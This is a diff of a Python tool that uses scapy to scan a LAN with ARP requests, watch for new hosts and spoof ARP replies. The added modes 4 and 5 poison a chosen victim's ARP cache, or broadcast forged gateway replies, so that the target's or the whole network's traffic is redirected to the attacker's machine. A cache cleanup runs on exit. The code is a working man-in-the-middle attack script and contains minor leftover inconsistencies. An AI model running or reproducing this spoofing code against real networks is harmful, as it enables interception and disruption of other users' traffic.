@@ -1,14 +1,10 @@
 import time
 
 import pyshark
-from scapy.all import srp
-from scapy.arch import get_if_addr
 from scapy.data import ETHER_BROADCAST
-from scapy.layers.inet import IP, ICMP
 from scapy.layers.l2 import Ether, ARP
-import os
 import multiprocessing
-import socket
+from getmac import get_mac_address as gma
 
 from scapy.sendrecv import send, sendp
 
@@ -17,11 +13,11 @@ interfaceeth = "\\Device\\NPF_{74953FAE-2A5B-48FE-AFA0-8E4B663A3EBE}"
 
 
 def search_ip():
-    for network in range(74, 79):
+    for network in range(0, 1):
         print("Searching range 172.17." + str(network) + ".0/24")
         pk_list = []
         for host in range(1, 253):
-            ip = "172.17." + str(network) + "." + str(host)
+            ip = "10.0." + str(network) + "." + str(host)
             pk_list.append(Ether(dst=ETHER_BROADCAST, src="") / ARP(op=1, pdst=ip, psrc="172.19.79.254"))
 
         sendp(pk_list, iface=interface, verbose=False)
@@ -45,24 +41,22 @@ def detect_arp(mac):
                         break
 
 
-def watch_for_host(mac_addr):
+def watch_for_host():
     capture = pyshark.LiveCapture(interface=interface,
-                                  display_filter="arp and arp.src.hw_mac == " + mac_addr)
+                                  display_filter="arp and arp.dst.proto_ipv4 == 10.0.0.138")
 
     table = {}
 
-    print("Waiting for host to show up...")
+    print("Waiting for hosts to show up...")
 
     while 1:
-        for packet in capture.sniff_continuously(packet_count=10):
+        for packet in capture.sniff_continuously(packet_count=2):
             ip = packet.arp.src_proto_ipv4
             mac = packet.arp.src_hw_mac
 
             if mac not in table:
                 table[mac] = ip
-                if mac == mac_addr:
-                    print("New host with MAC " + mac + " connected with IP " + ip)
-                    break
+                print("New host with MAC " + mac + " connected with IP " + ip)
 
 
 def auto_spoof(mac):
@@ -92,7 +86,7 @@ if __name__ == '__main__':
     print("5) Redirect network traffic to one host")
     mode = int(input("Input: "))
 
-    if mode != 4:
+    if mode != 4 and mode != 5 and mode != 2:
         search_mac = input("Victim MAC-Address: ")
 
     if mode == 1:
@@ -102,23 +96,45 @@ if __name__ == '__main__':
         p.start()
         p2.start()
     elif mode == 2:
-        p3 = multiprocessing.Process(target=watch_for_host, name="Watch for specific MAC when connecting",
-                                     args=(search_mac,))
+        p3 = multiprocessing.Process(target=watch_for_host, name="Watch for specific MAC when connecting")
         p3.start()
     elif mode == 3:
         p4 = multiprocessing.Process(target=auto_spoof, name="", args=(search_mac,))
         p4.start()
     elif mode == 4:
-        print("Not implemented yet!")
-    elif mode == 5:
         tmac = input("Target MAC: ")
+        gmac = input("Gateway MAC: ")
+        gip = input("Gateway IP: ")
+        omac = gma()
+        correct_mac = input("Is this your MAC-Address: " + str(omac) + " (y/n): ")
+
         try:
             while 1:
                 print("Send ARP...")
-                send_arp("172.17.79.255", "172.17.79.254", "FF:FF:FF:FF:FF:FF", "40:66:55:E2:9D:7B")
-                time.sleep(0.1)
+                send_arp("0.0.0.0", gip, tmac, omac)
+                time.sleep(0.3)
         except:
             for i in range(0, 10):
                 print("Cleaning up ARP Cache...")
-                send_arp("172.17.79.255", "172.17.79.254", "FF:FF:FF:FF:FF:FF", "44:1e:a1:9b:a0:00")
+                send_arp("0.0.0.0", gip, tmac, gmac)
+                time.sleep(0.5)
+
+    elif mode == 5:
+        gmac = input("Gateway MAC: ")
+        gip = input("Gateway IP: ")
+        omac = gma()
+        correct_mac = input("Is this your MAC-Address: " + str(omac) + " (y/n): ")
+
+        if correct_mac == 'n':
+            omac = input("Correct MAC: ")
+
+        try:
+            while 1:
+                print("Send ARP...")
+                send_arp("0.0.0.0", gip, "FF:FF:FF:FF:FF:FF", omac)
+                time.sleep(0.2)
+        except:
+            for i in range(0, 10):
+                print("Cleaning up ARP Cache...")
+                send_arp("0.0.0.0", gip, "FF:FF:FF:FF:FF:FF", gmac)
                 time.sleep(0.5)
